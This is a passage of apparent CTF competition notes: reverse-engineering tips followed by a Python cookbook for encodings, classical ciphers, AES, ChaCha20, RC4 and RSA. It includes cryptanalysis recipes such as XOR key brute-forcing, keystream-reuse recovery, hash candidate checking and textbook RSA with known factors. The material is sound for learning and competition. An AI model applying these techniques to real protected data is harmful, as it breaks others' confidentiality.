Authentication failure means the inputs/format/model need investigation; ignoring the tag is not a valid verified decryption. CBC padding success alone is also weak evidence.
6. Stateful flag computation A game or sequence challenge may hash every action and use that hash to decrypt a final blob. Map state transitions explicitly:
Action State effect Evidence talk(text) Adds length and updates rolling hash Loop and length check move(id) Updates sequence tag Switch/transition table finish() Checks counters and decrypts Success branch Patching only finish() may leave the wrong key. Reach the correct state or reproduce all state-dependent key derivation in the model.
7. VM and control-flow obfuscation Separate dispatcher noise from opcode semantics. Recover one opcode at a time with a tiny trace. Record stack underflow behavior, integer widths, signed branches, operand endianness and PC updates. A generic eval of unknown bytecode is not a VM implementation.
Opaque predicates and flattened control flow can be simplified after identifying the state variable and transitions. Confirm any assumed invariant dynamically at multiple inputs before discarding a branch as unreachable.
8. Constraints vs direct inversion Use direct inversion for bijective independent byte transforms. Use bounded enumeration for a tiny finite key. Use an optional constraint solver when cross-byte equations, carries and branches make manual inversion awkward.
Z3 bitvectors model wraparound, but signed comparisons and arithmetic shift differ from unsigned comparison/logical shift. Use ULT/ULE/UGT/UGE and LShR when the native operation is unsigned. See downloadable model for an explicit small example and its dependency boundary.
Finish Compare forward-model bytes with a known debugger trace, recover a candidate, then run it through the original unpatched validator. Save intermediate states so a one-byte discrepancy can be located rather than guessed away.
References Python modular pow, Z3 Python API, Intel instruction references, NIST AES specification.

title: Python 3
content:
Use for: byte manipulation, decoding, small solvers, artifact parsing.
Run in: WSL. Exact Python 3.x version depends on the competition PC.
Tournament rule: additional libraries are allowed except AI/ML related libraries and tools.
Choose the operation first Kind Examples Required information Text encoding UTF-8, UTF-16LE, Latin-1 Character encoding Binary-to-text encoding Hex, Base64, Base32, Base85 Alphabet and framing; no secret key Escaping URL percent escapes, HTML entities Escaping convention Compression gzip, zlib, bzip2, LZMA/XZ Wrapper/format; usually no key Classical cipher Caesar, ROT13, Vigenère Shift or keyword, alphabet rules XOR One byte, repeating key, stream XOR Key/keystream or a recoverable weakness Symmetric encryption AES, ChaCha20, Salsa20 Key plus mode-specific IV/nonce/counter Authenticated encryption AES-GCM/EAX, ChaCha20-Poly1305 Key, nonce, ciphertext, tag, optional AAD Public-key encryption RSA / RSA-OAEP Private key or a demonstrated weakness Hash / MAC / KDF SHA-256, HMAC, PBKDF2, scrypt Exact input bytes and algorithm parameters Encoding is reversible without a secret. Hashes do not have a general decode/decrypt operation. A value that resembles hex could represent ciphertext, a hash, a key or ordinary bytes; identify its role from the challenge.
Cookbook map Encode/decode bytes and text Hex and Base encodings URL/HTML/escape layers Classical ciphers Compression wrappers XOR recipes Hashes, HMAC and key derivation AES modes ChaCha20 and related stream ciphers RSA-OAEP and weak-RSA recipes The cookbook snippets are separate examples. Each crypto example imports what it uses; the XOR helper section explicitly defines shared functions for the following XOR recipes.
Prepare non-AI crypto libraries Python’s standard library handles encodings, hashing, compression and basic modular arithmetic. The AES/ChaCha/RSA-OAEP examples below use PyCryptodome:
# --python chooses the existing interpreter; .venv is the environment directory uv venv --python python3 .venv # --python targets that exact environment; pycryptodome is the package name uv pip install --python .venv/bin/python pycryptodome # -c executes a short Python statement; Crypto is the import namespace .venv/bin/python -c 'from Crypto.Cipher import AES, ChaCha20; print("crypto imports OK")' # -u gives live/unbuffered output while running your saved solver .venv/bin/python -u solve.pyThese are usage examples; no package installation is performed by these notes. pycryptodome imports as Crypto; the alternative package pycryptodomex imports as Cryptodome. Use one consistent namespace and interpreter.
Quick commands python3 --version # Check the supplied interpreter python3 solve.py # Run a saved CTF solver python3 -m json.tool input.json # Pretty print an API response python3 -m zipfile -l archive.zip # List ZIP members before extraction python3 -m zipfile -e archive.zip out/ # Extract into a separate folder python3 -m venv .venv # Create an isolated package environment source .venv/bin/activate # Use that environment in this terminalWalkthrough: decode and inspect bytes Save as solve.py and run python3 solve.py:
from pathlib import Path import base64 import hashlib import re encoded = Path("input.txt").read_text().strip() data = base64.b64decode(encoded) Path("decoded.bin").write_bytes(data) print("length:", len(data)) print("sha256:", hashlib.sha256(data).hexdigest()) print(re.findall(rb"flag\{[^}\r\n]+\}", data))Byte recipes bytes.fromhex("666c6167") # Hex text → raw bytes int.from_bytes(b"\x34\x12", "little") # Decode a little-endian integer (0x1234).to_bytes(2, "little") # Encode an integer into two bytes # Repeating-key XOR: use the challenge's actual data and key data = b"example" key = b"key" result = bytes(b ^ key[i % len(key)] for i, b in enumerate(data)) # Modular inverse, when e and phi are coprime pow(65537, -1, 3120)Gotchas Use read_bytes() / write_bytes() for binary data. A Python str and bytes are different; specify encoding when converting. Do not use eval() to parse challenge input. Use json.loads() for JSON. Use uv for approved dependency environments. Python command-line flags explained Flag Meaning Example --version Print the interpreter version python3 --version -m MODULE Run an installed module as a program python3 -m json.tool input.json -c CODE Execute a short source string python3 -c 'print(123)' -u Use unbuffered stdout/stderr python3 -u solve.py for live logs - Read Python source from stdin Used by heredoc examples In python3 -m zipfile -l archive.zip, -m belongs to Python and -l belongs to the zipfile module’s CLI: it lists archive members. That module’s -e ARCHIVE DIR extracts into DIR. python3 -m venv DIR creates an environment at the positional path DIR.
CTF: try every single-byte XOR key Save as xor_one.py. It searches raw ciphertext for a known prefix and prints the key with the candidate plaintext.
from pathlib import Path data = Path("cipher.bin").read_bytes() for key in range(256): plain = bytes(byte ^ key for byte in data) if b"flag{" in plain.lower(): print(f"key={key:#04x}", repr(plain))For a repeating key, recover a candidate key segment with cipher_byte ^ known_plain_byte. Check the segment repeats across the ciphertext; one matching prefix is weak evidence.
CTF: textbook RSA when factors are known from math import gcd # Small worked example; replace with supplied integers p, q, e, c = 61, 53, 17, 2790 n = p * q phi = (p - 1) * (q - 1) assert gcd(e, phi) == 1 d = pow(e, -1, phi) m = pow(c, d, n) plain = m.to_bytes(max(1, (m.bit_length() + 7) // 8), "big") print("m:", m) # 65 print("bytes:", repr(plain)) # b'A' assert pow(m, e, n) == c # Verify by re-encryptingThis model assumes two distinct primes and textbook RSA. OAEP/PKCS#1 padding needs the correct decoder. A leading zero byte can matter when preserving a fixed-size encoded block.
Encode and decode text without losing bytes text = "flag{demo}" raw = text.encode("utf-8") # str → bytes restored = raw.decode("utf-8") # bytes → str print(raw, restored) wide = text.encode("utf-16le") # Explicit little endian; no automatic BOM print(wide.hex()) print(wide.decode("utf-16le")) all_bytes = bytes(range(256)) as_latin1 = all_bytes.decode("latin-1") assert as_latin1.encode("latin-1") == all_bytesLatin-1 provides a reversible byte-to-character mapping, not evidence that unknown bytes are actually Latin-1 text. decode(errors="replace") is useful for previewing, but replacement characters lose information. Keep the original bytes for further decoding/decryption.
Literal escape text versus real bytes import codecs escaped = r"\x66\x6c\x61\x67\x7b\x64\x65\x6d\x6f\x7d" raw = codecs.escape_decode(escaped.encode("ascii"))[0] print(raw) # b'flag{demo}' # A JSON Unicode escape should be parsed as JSON import json print(json.loads(r'"\u0066\u006c\u0061\u0067"'))Use escape decoding only when the challenge explicitly supplies escaped bytes. A filename with backslashes or literal \n text may not be an encoded byte stream. Never use eval() to interpret supplied source-like strings.
Hex encode and decode raw = b"flag{demo}" hex_text = raw.hex() # bytes → lowercase hex text print(hex_text) print(bytes.fromhex(hex_text)) # hex text → bytes print(bytes.fromhex("66 6c 61 67")) # Whitespace between byte pairs is accepted # One integer value is different from a sequence of hex bytes number = int("0x1234", 16) print(number.to_bytes(2, "big")) # b'\x12\x34'Hex takes two characters per byte. b"deadbeef" is eight ASCII bytes; bytes.fromhex("deadbeef") is four bytes. Prefixes such as 0x and delimiters such as commas must be handled according to the input format before fromhex().
Base64 encode and decode import base64 raw = b"flag{demo}" encoded = base64.b64encode(raw) print(encoded.decode("ascii")) decoded = base64.b64decode(encoded, validate=True) print(decoded) # Remove only documented whitespace; validate the remaining alphabet wrapped = b"ZmxhZ3tk\nZW1vfQ==\n" compact = b"".join(wrapped.split()) print(base64.b64decode(compact, validate=True))validate=True rejects unexpected characters rather than silently ignoring them. Do not remove arbitrary characters just to make a decoder accept damaged input.
Base64URL and omitted padding import base64 import json payload = json.dumps({"role": "user"}, separators=(",", ":")).encode() token_part = base64.urlsafe_b64encode(payload).rstrip(b"=") # Restore padding when the format deliberately omits it padded = token_part + b"=" * (-len(token_part) % 4) decoded = base64.b64decode(padded, altchars=b"-_", validate=True) print(json.loads(decoded))altchars=b"-_" selects the URL-safe replacements for + and /. A remainder of one character modulo four cannot represent valid ordinary Base64 data merely by adding padding. Decoding a JWT section does not validate its signature.
Base32, Base16, Base85 and Ascii85 import base64 raw = b"flag{demo}" for name, encode, decode in [ ("Base16", base64.b16encode, base64.b16decode), ("Base32", base64.b32encode, base64.b32decode), ("Base85", base64.b85encode, base64.b85decode), ("Ascii85", base64.a85encode, base64.a85decode), ]: encoded = encode(raw) print(name, encoded, decode(encoded)) # Accept lowercase letters only when that input convention is intended print(base64.b32decode(base64.b32encode(raw).lower(), casefold=True)) # Adobe-style Ascii85 framing uses <~ ... ~> adobe = base64.a85encode(raw, adobe=True) print(base64.a85decode(adobe, adobe=True))Base85 and Ascii85 use different alphabets. Standard-library Base85 is not a universal decoder for every format named “Base85”; Base58, Base62 and Z85 also require their particular alphabet/implementation.
URL and HTML encode and decode import html from urllib.parse import quote, unquote, quote_plus, unquote_plus, unquote_to_bytes text = "flag{a+b c}" escaped = quote(text, safe="") # Percent-escape all non-unreserved characters print(escaped, unquote(escaped)) form_value = quote_plus(text) # Space becomes +; literal + becomes %2B print(form_value, unquote_plus(form_value)) raw = unquote_to_bytes("%ff%00%41") # Preserve bytes that are not UTF-8 print(raw.hex()) entity = html.escape("<flag>&demo") print(entity, html.unescape(entity))Use unquote_plus() for form-style values; it changes + to a space. Use unquote()/unquote_to_bytes() when a literal plus must survive. Decode one documented layer at a time: %252f becomes %2f, then / after a second pass.
Binary digits, decimal bytes and integers # ASCII bytes → a bit string → bytes raw = b"flag" bits = "".join(f"{byte:08b}" for byte in raw) assert len(bits) % 8 == 0 restored = bytes(int(bits[i:i + 8], 2) for i in range(0, len(bits), 8)) print(bits, restored) # Decimal byte list from a challenge decimal_text = "102 108 97 103" print(bytes(int(piece) for piece in decimal_text.split())) # Integer-to-bytes: big endian is common in textbook RSA number = int.from_bytes(raw, "big") width = max(1, (number.bit_length() + 7) // 8) print(number, number.to_bytes(width, "big"))An integer does not preserve leading zero bytes. Use a known field/block length when the encoding is fixed width. Do not silently pad or drop partial bit groups without a format rule.
ROT13, Caesar and Atbash import codecs print(codecs.encode("flag{demo}", "rot_13")) print(codecs.decode("synt{qrzb}", "rot_13")) def caesar(text: str, shift: int) -> str: result = [] for char in text: if "a" <= char <= "z": result.append(chr((ord(char) - ord("a") + shift) % 26 + ord("a"))) elif "A" <= char <= "Z": result.append(chr((ord(char) - ord("A") + shift) % 26 + ord("A"))) else: result.append(char) return "".join(result) encrypted = caesar("flag{demo}", 3) print(encrypted, caesar(encrypted, -3)) for shift in range(26): print(shift, caesar(encrypted, -shift)) alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ" reversed_alphabet = "zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA" print("uozt{wvnl}".translate(str.maketrans(alphabet, reversed_alphabet)))The Caesar helper shifts only ASCII letters and preserves punctuation. ROT13 and Atbash are self-inverse. These classical transforms are useful when the clue/alphabet supports them; they do not decrypt modern AES/RSA ciphertext.
Vigenère: repeating keyword over letters def vigenere(text: str, keyword: str, decrypt: bool = False) -> str: if not keyword or any(not ("a" <= char <= "z") for char in keyword.lower()): raise ValueError("Keyword must contain ASCII letters only") shifts = [ord(char) - ord("a") for char in keyword.lower()] result, position = [], 0 direction = -1 if decrypt else 1 for char in text: if "a" <= char <= "z" or "A" <= char <= "Z": base = ord("a") if char.islower() else ord("A") shift = shifts[position % len(shifts)] result.append(chr((ord(char) - base + direction * shift) % 26 + base)) position += 1 else: result.append(char) return "".join(result) encrypted = vigenere("flag{demo}", "key") print(encrypted, vigenere(encrypted, "key", decrypt=True))This convention advances the keyword only on ASCII letters. Some challenges advance it on every character or use a custom alphabet; reproduce the actual rule.
Compress and decompress common wrappers import bz2 import gzip import lzma import zlib raw = b"flag{demo}" for name, compress, decompress in [ ("gzip", gzip.compress, gzip.decompress), ("zlib", zlib.compress, zlib.decompress), ("bzip2", bz2.compress, bz2.decompress), ("xz", lzma.compress, lzma.decompress), ]: packed = compress(raw) print(name, packed[:12].hex(), decompress(packed))Raw DEFLATE is different from zlib-wrapped data import zlib compressor = zlib.compressobj(wbits=-15) packed = compressor.compress(b"flag{demo}") + compressor.flush() print(zlib.decompress(packed, wbits=-15))wbits=-15 selects raw DEFLATE; ordinary zlib data normally includes its wrapper/checksum. An archive container and its compression stream are different layers. Save output as bytes before deciding that decompression “looks wrong.”
XOR helpers with explicit length rules def xor_equal(left: bytes, right: bytes) -> bytes: """XOR equal-length byte strings without silently truncating.""" if len(left) != len(right): raise ValueError("XOR inputs must have equal lengths") return bytes(a ^ b for a, b in zip(left, right)) def xor_repeat(data: bytes, key: bytes) -> bytes: """XOR with a repeating key; the same operation decrypts.""" if not key: raise ValueError("Repeating XOR key must not be empty") return bytes(value ^ key[index % len(key)] for index, value in enumerate(data)) plain = b"flag{demo}" cipher = xor_repeat(plain, b"key") print(cipher.hex(), xor_repeat(cipher, b"key"))Use these helper definitions before the following XOR snippets. Plain zip() truncates to the shorter input, which can hide a length error.
XOR: recover a known plaintext keystream segment # Worked example; replace ciphertext and known bytes with challenge values cipher = xor_repeat(b"flag{demo}", b"key") known = b"flag{" segment = xor_equal(cipher[:len(known)], known) print("keystream prefix:", segment.hex(), repr(segment))This recovers only the keystream bytes aligned with the known plaintext. If a repeating key is suspected, test a candidate period across the full ciphertext; the prefix alone does not reveal every possible key.
XOR: reuse of the same stream at the same position key_stream = bytes.fromhex("00112233445566778899") plain1, plain2 = b"flag{demo}", b"hello!!!!!" cipher1 = xor_equal(plain1, key_stream) cipher2 = xor_equal(plain2, key_stream) # C1 XOR C2 = P1 XOR P2; knowing P1 recovers this part of P2 recovered = xor_equal(xor_equal(cipher1, cipher2), plain1) print(recovered)The messages must overlap at the same keystream position. Matching nonces do not suffice if keys, counters, offsets or protocols differ. This principle applies to reused XOR pads and some stream/CTR encryption mistakes; it does not directly recover the underlying cipher key.
Hash: digest bytes versus hex text import hashlib data = b"flag{demo}" for name in ("md5", "sha1", "sha256", "sha512"): digest = hashlib.new(name, data) print(name, digest.hexdigest()) raw_digest = hashlib.sha256(data).digest() # 32 bytes hex_digest = hashlib.sha256(data).hexdigest() # 64 hex characters print(len(raw_digest), len(hex_digest))MD5/SHA-1 appear in legacy CTFs. Hash matching requires exact input bytes, including newline, case and any salt placement. Encoding a hash as Base64/hex is not encryption and does not make it decryptable.
Hash: compare a small supplied candidate list import hashlib target = hashlib.sha256(b"demo").hexdigest() for candidate in ("test", "demo", "example"): if hashlib.sha256(candidate.encode("utf-8")).hexdigest() == target: print("matching candidate:", candidate)This is candidate checking, not a general reversal of SHA-256. Match any given salt/KDF before testing values.
HMAC: create and verify a keyed digest import hashlib import hmac key = b"demo-hmac-key" message = b"role=user" tag = hmac.new(key, message, hashlib.sha256).digest() expected_hex = tag.hex() print(expected_hex) candidate_tag = bytes.fromhex(expected_hex) print(hmac.compare_digest(tag, candidate_tag))HMAC uses a key and authenticates bytes; it does not encrypt them. compare_digest() compares equivalent representations. Do not compare raw tag bytes with their ASCII hex encoding.
PBKDF2 and scrypt: password to key bytes import hashlib password = "demo-password".encode("utf-8") salt = bytes.fromhex("00112233445566778899aabbccddeeff") # Example parameters only: reproduce the challenge's exact settings pbkdf2_key = hashlib.pbkdf2_hmac("sha256", password, salt, 100_000, dklen=32) scrypt_key = hashlib.scrypt(password, salt=salt, n=2**14, r=8, p=1, dklen=32) print(pbkdf2_key.hex()) print(scrypt_key.hex()) Argument Meaning password Encoded password bytes, not automatically a raw AES key salt Salt bytes from the challenge/container PBKDF2 hash and iterations Pseudorandom function and work count dklen Derived output length in bytes scrypt n, r, p Cost parameters; required to reproduce the derived key Some Python/OpenSSL builds may not provide every KDF. An arbitrary KDF, salt or iteration count will not match the ciphertext just because the resulting key has a valid length.
Sources: base encodings, codecs, URL parsing, compression, hashlib, HMAC.
AES: choose the correct mode AES always operates on 16-byte blocks internally. AES-128/192/256 describes the key length: 16/24/32 bytes. A 32-character hex key decodes to 16 bytes; it is not a 32-byte key.
Mode Inputs besides key/plaintext Padding in these examples CTF clue / common mistake ECB None PKCS#7 for arbitrary length Equal plaintext blocks give equal ciphertext blocks CBC 16-byte IV PKCS#7 IV, previous block and ciphertext alignment matter CTR Nonce and counter layout/start None Match nonce length, byte order and starting counter CFB 16-byte IV and segment size None CFB8 and CFB128 are different OFB 16-byte IV None Correct IV/state required GCM Nonce, authentication tag, optional AAD None Verify tag before using plaintext EAX Nonce, authentication tag, optional AAD None Similar interface does not mean compatible with GCM Each example creates fresh random parameters for a local round trip. To decrypt a supplied artifact, use its actual key, mode, IV/nonce, ciphertext and other parameters. Generating new random values will not decrypt it.
AES-ECB: encrypt and decrypt from Crypto.Cipher import AES from Crypto.Random import get_random_bytes from Crypto.Util.Padding import pad, unpad key = get_random_bytes(16) # 16 bytes selects AES-128 plain = b"flag{demo}" ciphertext = AES.new(key, AES.MODE_ECB).encrypt(pad(plain, AES.block_size)) recovered = unpad(AES.new(key, AES.MODE_ECB).decrypt(ciphertext), AES.block_size) print("key:", key.hex(), "ciphertext:", ciphertext.hex()) print(recovered)AES.block_size is 16. pad() adds PKCS#7 padding; unpad() validates/removes it. If the challenge encrypts already-aligned raw blocks without padding, do not add/remove PKCS#7 automatically.
CTF: find repeated 16-byte blocks from collections import Counter from pathlib import Path data = Path("cipher.bin").read_bytes() blocks = [data[i:i + 16] for i in range(0, len(data) - 15, 16)] print([(block.hex(), count) for block, count in Counter(blocks).items() if count > 1])Repeats suggest ECB or repeated data at that alignment, but do not prove ECB. Remove known file headers before comparing the ciphertext area, and inspect different framing if the block boundary is offset.
AES-CBC: encrypt and decrypt from Crypto.Cipher import AES from Crypto.Random import get_random_bytes from Crypto.Util.Padding import pad, unpad key = get_random_bytes(32) # 32 bytes selects AES-256 iv = get_random_bytes(16) # CBC IV remains 16 bytes plain = b"flag{demo}" ciphertext = AES.new(key, AES.MODE_CBC, iv=iv).encrypt(pad(plain, 16)) decrypted_blocks = AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ciphertext) recovered = unpad(decrypted_blocks, 16) print("key:", key.hex(), "iv:", iv.hex(), "ct:", ciphertext.hex()) print(recovered)CBC decryption follows P[i] = AES_decrypt(C[i]) XOR previous_block, where the previous block for P[0] is the IV. A wrong IV changes the first plaintext block; damaged ciphertext can affect more than one block. A padding error can also mean a wrong key, mode, length or padding convention.
CTF: decrypt an IV-prefixed CBC file from pathlib import Path from Crypto.Cipher import AES from Crypto.Util.Padding import unpad # Example key only: replace with the challenge key key = bytes.fromhex("00112233445566778899aabbccddeeff") blob = Path("iv_then_ciphertext.bin").read_bytes() iv, ciphertext = blob[:16], blob[16:] if len(iv) != 16 or not ciphertext or len(ciphertext) % 16: raise ValueError("Not the expected IV + aligned CBC ciphertext layout") plain = unpad(AES.new(key, AES.MODE_CBC, iv=iv).decrypt(ciphertext), 16) Path("plain.bin").write_bytes(plain) print(repr(plain[:200]))This parser applies only when the container is documented as 16-byte IV || CBC ciphertext. A salt, length field or tag changes where bytes must be split.
AES-CTR: nonce and starting counter from Crypto.Cipher import AES from Crypto.Random import get_random_bytes key = get_random_bytes(16) nonce = get_random_bytes(8) start = 1 plain = b"flag{demo}" ciphertext = AES.new(key, AES.MODE_CTR, nonce=nonce, initial_value=start).encrypt(plain) recovered = AES.new(key, AES.MODE_CTR, nonce=nonce, initial_value=start).decrypt(ciphertext) print("key:", key.hex(), "nonce:", nonce.hex(), "counter:", start) print(ciphertext.hex(), recovered)For this layout, the 16-byte counter block contains an 8-byte nonce followed by an 8-byte big-endian counter. initial_value sets that counter’s initial integer. Other protocols use other layouts. Use Crypto.Util.Counter.new() if a specified format requires a little-endian counter or a prefix/suffix.
AES-CFB and OFB: no PKCS#7 padding from Crypto.Cipher import AES from Crypto.Random import get_random_bytes key, iv = get_random_bytes(16), get_random_bytes(16) plain = b"flag{demo}" # Match segment_size to the challenge; PyCryptodome defaults to 8 bits ct_cfb = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=128).encrypt(plain) pt_cfb = AES.new(key, AES.MODE_CFB, iv=iv, segment_size=128).decrypt(ct_cfb) print("CFB128:", ct_cfb.hex(), pt_cfb) # Use a separate IV for the separate encryption example iv_ofb = get_random_bytes(16) ct_ofb = AES.new(key, AES.MODE_OFB, iv=iv_ofb).encrypt(plain) pt_ofb = AES.new(key, AES.MODE_OFB, iv=iv_ofb).decrypt(ct_ofb) print("OFB:", ct_ofb.hex(), pt_ofb)segment_size=128 is measured in bits, not bytes. CFB8 ciphertext will not correctly decrypt with CFB128 even with the same key and IV.
AES-GCM: authenticated encrypt and decrypt from Crypto.Cipher import AES from Crypto.Random import get_random_bytes key = get_random_bytes(32) nonce = get_random_bytes(12) # Explicit 12-byte nonce for this format aad = b"challenge-header" # Authenticated, but not encrypted plain = b"flag{demo}" encryptor = AES.new(key, AES.MODE_GCM, nonce=nonce, mac_len=16) encryptor.update(aad) ciphertext, tag = encryptor.encrypt_and_digest(plain) decryptor = AES.new(key, AES.MODE_GCM, nonce=nonce, mac_len=16) decryptor.update(aad) recovered = decryptor.decrypt_and_verify(ciphertext, tag) print("nonce:", nonce.hex(), "ct:", ciphertext.hex(), "tag:", tag.hex()) print(recovered)update(aad) supplies exactly the bytes authenticated as associated data. mac_len=16 requests a 16-byte tag. A tag failure can reflect a wrong key, nonce, ciphertext, tag, AAD or container split. Do not print/use unauthenticated plaintext as a successful result.
AES-EAX: authenticated encrypt and decrypt from Crypto.Cipher import AES from Crypto.Random import get_random_bytes key, nonce = get_random_bytes(16), get_random_bytes(16) aad, plain = b"header", b"flag{demo}" encryptor = AES.new(key, AES.MODE_EAX, nonce=nonce) encryptor.update(aad) ciphertext, tag = encryptor.encrypt_and_digest(plain) decryptor = AES.new(key, AES.MODE_EAX, nonce=nonce) decryptor.update(aad) print(decryptor.decrypt_and_verify(ciphertext, tag))EAX and GCM have similar method names but are different constructions. Select the mode from the encryption source/protocol rather than trying a different mode until text happens to appear.
Crypto arguments explained Argument / method Meaning key Raw secret bytes, after any specified decoding/KDF iv Mode-specific initialization bytes; CBC/CFB/OFB use 16 bytes for AES nonce Per-message value used by CTR/GCM/EAX or a stream cipher initial_value Starting CTR counter integer segment_size CFB feedback size, measured in bits mac_len Requested authentication-tag length in bytes update(aad) Supply additional authenticated data, unchanged on both sides encrypt_and_digest() Return ciphertext plus authentication tag decrypt_and_verify() Decrypt and reject a mismatched tag pad(data, 16) Add PKCS#7 block padding by default unpad(data, 16) Validate/remove that padding Raw hex text, UTF-8 password bytes and KDF output are different key representations. For new encryption, use fresh IVs/nonces according to the mode’s rules; reusing a stream/CTR/GCM nonce with the same key can break security.
Sources: AES API, classic modes, authenticated modes, padding and counter utilities.
ChaCha20: encrypt and decrypt from Crypto.Cipher import ChaCha20 from Crypto.Random import get_random_bytes key = get_random_bytes(32) # ChaCha20 key: 32 bytes nonce = get_random_bytes(12) # IETF-size nonce for this example plain = b"flag{demo}" ciphertext = ChaCha20.new(key=key, nonce=nonce).encrypt(plain) recovered = ChaCha20.new(key=key, nonce=nonce).decrypt(ciphertext) print("key:", key.hex(), "nonce:", nonce.hex(), "ct:", ciphertext.hex()) print(recovered)ChaCha20 is a stream cipher: no PKCS#7 padding and no built-in authentication tag. Encryption and decryption consume the same keystream bytes, so create a fresh cipher object at the same starting position for the other direction.
ChaCha nonce variants and counter position Variant in PyCryptodome Nonce length Required distinction Original ChaCha20 8 bytes Different layout from the IETF variant IETF ChaCha20 12 bytes Counter/offset must match the protocol XChaCha20 24 bytes Extended nonce construction The raw cipher’s seek(N) positions the keystream at byte offset N. A ChaCha block is 64 bytes; a protocol starting at block counter 1 requires position 64 relative to the zero-based raw stream.
from Crypto.Cipher import ChaCha20 from Crypto.Random import get_random_bytes key, nonce = get_random_bytes(32), get_random_bytes(12) offset = 64 # Byte offset, not block number encryptor = ChaCha20.new(key=key, nonce=nonce) encryptor.seek(offset) ciphertext = encryptor.encrypt(b"flag{demo}") decryptor = ChaCha20.new(key=key, nonce=nonce) decryptor.seek(offset) print(decryptor.decrypt(ciphertext))Do not add this offset unless the challenge specifies that stream position. Library APIs can package counters/nonces differently; porting only the visible nonce bytes can still produce the wrong stream.
XChaCha20 example from Crypto.Cipher import ChaCha20 from Crypto.Random import get_random_bytes key, nonce = get_random_bytes(32), get_random_bytes(24) ciphertext = ChaCha20.new(key=key, nonce=nonce).encrypt(b"flag{demo}") print(ChaCha20.new(key=key, nonce=nonce).decrypt(ciphertext))ChaCha20-Poly1305: authenticated encryption from Crypto.Cipher import ChaCha20_Poly1305 from Crypto.Random import get_random_bytes key, nonce = get_random_bytes(32), get_random_bytes(12) aad, plain = b"challenge-header", b"flag{demo}" encryptor = ChaCha20_Poly1305.new(key=key, nonce=nonce) encryptor.update(aad) ciphertext, tag = encryptor.encrypt_and_digest(plain) decryptor = ChaCha20_Poly1305.new(key=key, nonce=nonce) decryptor.update(aad) recovered = decryptor.decrypt_and_verify(ciphertext, tag) print("nonce:", nonce.hex(), "ct:", ciphertext.hex(), "tag:", tag.hex()) print(recovered)Poly1305 adds authentication; the tag is 16 bytes for this API. This is not equivalent to running raw ChaCha20 from its default position and ignoring the tag. For XChaCha20-Poly1305, the API also supports a 24-byte nonce; the supplied challenge/library version must agree.
Sources: ChaCha20/XChaCha20 and seek, ChaCha20-Poly1305.
Salsa20, RC4 and 3DES in legacy CTFs Salsa20: 8-byte nonce from Crypto.Cipher import Salsa20 from Crypto.Random import get_random_bytes key, nonce = get_random_bytes(32), get_random_bytes(8) ciphertext = Salsa20.new(key=key, nonce=nonce).encrypt(b"flag{demo}") print(Salsa20.new(key=key, nonce=nonce).decrypt(ciphertext))Salsa20 and ChaCha20 are distinct ciphers; do not exchange their names just because both use XOR keystreams.
RC4 / ARC4: match the dropped keystream prefix from Crypto.Cipher import ARC4 from Crypto.Random import get_random_bytes key = get_random_bytes(16) drop = 3072 # Example only; challenge may use 0 or another value ciphertext = ARC4.new(key, drop=drop).encrypt(b"flag{demo}") print(ARC4.new(key, drop=drop).decrypt(ciphertext))drop skips that many initial keystream bytes. A wrong drop count gives the wrong plaintext. RC4 is a legacy/weak cipher; use it here to reproduce a challenge’s actual construction.
3DES-CBC: 8-byte blocks and IV from Crypto.Cipher import DES3 from Crypto.Random import get_random_bytes from Crypto.Util.Padding import pad, unpad # Reproducible demonstration key with distinct DES components, not a real secret key = DES3.adjust_key_parity(bytes.fromhex( "0123456789abcdeffedcba987654321089abcdef01234567" )) iv = get_random_bytes(8) ciphertext = DES3.new(key, DES3.MODE_CBC, iv=iv).encrypt(pad(b"flag{demo}", 8)) plain = unpad(DES3.new(key, DES3.MODE_CBC, iv=iv).decrypt(ciphertext), 8) print(plain)3DES has 8-byte blocks, unlike AES’s 16-byte blocks. Accepted key sizes and parity rules are cipher-specific. These legacy recipes are for matching supplied CTF artifacts, not choosing a new encryption design.
Sources: Salsa20, ARC4, Triple DES.
RSA-OAEP: encrypt and decrypt from Crypto.Cipher import PKCS1_OAEP from Crypto.Hash import SHA256 from Crypto.PublicKey import RSA private_key = RSA.generate(2048) # Demonstration; not an attack on an existing key public_key = private_key.public_key() plain = b"flag{demo}" encryptor = PKCS1_OAEP.new(public_key, hashAlgo=SHA256) ciphertext = encryptor.encrypt(plain) decryptor = PKCS1_OAEP.new(private_key, hashAlgo=SHA256) print(decryptor.decrypt(ciphertext))hashAlgo=SHA256 chooses OAEP’s hash. The PKCS1_OAEP compatibility API defaults to SHA-1 when omitted; newer builds also expose Crypto.Cipher.oaep.new(key, hashmod=SHA256), which requires an explicit hash. The examples use the compatible PKCS1_OAEP interface with its hash stated explicitly.
The hash, MGF settings and optional label must match the original encryption. OAEP limits the plaintext size; a 2048-bit RSA key with SHA-256 accepts at most 190 message bytes.
RSA-OAEP: use a supplied private key and ciphertext from pathlib import Path from Crypto.Cipher import PKCS1_OAEP from Crypto.Hash import SHA256 from Crypto.PublicKey import RSA key = RSA.import_key(Path("private.pem").read_bytes()) ciphertext = Path("ciphertext.bin").read_bytes() plain = PKCS1_OAEP.new(key, hashAlgo=SHA256).decrypt(ciphertext) Path("plain.bin").write_bytes(plain) print(repr(plain))An encrypted PEM needs its supplied passphrase via RSA.import_key(..., passphrase=...). A public key alone normally cannot decrypt OAEP ciphertext. For numeric n/e/c and leaked factors, use the textbook RSA recipe earlier on this page; do not apply OAEP unpadding to textbook ciphertext without evidence.
RSA PKCS#1 v1.5: legacy padded encryption from Crypto.Cipher import PKCS1_v1_5 from Crypto.PublicKey import RSA from Crypto.Random import get_random_bytes key = RSA.generate(2048) ciphertext = PKCS1_v1_5.new(key.public_key()).encrypt(b"flag{demo}") sentinel = get_random_bytes(32) # Returned if this API rejects the padding plain = PKCS1_v1_5.new(key).decrypt(ciphertext, sentinel) if plain == sentinel: raise ValueError("PKCS#1 v1.5 decryption failed") print(plain)This is encryption padding, not the similarly named signature scheme. OAEP, PKCS#1 v1.5 and textbook RSA are different encodings of the RSA message integer.
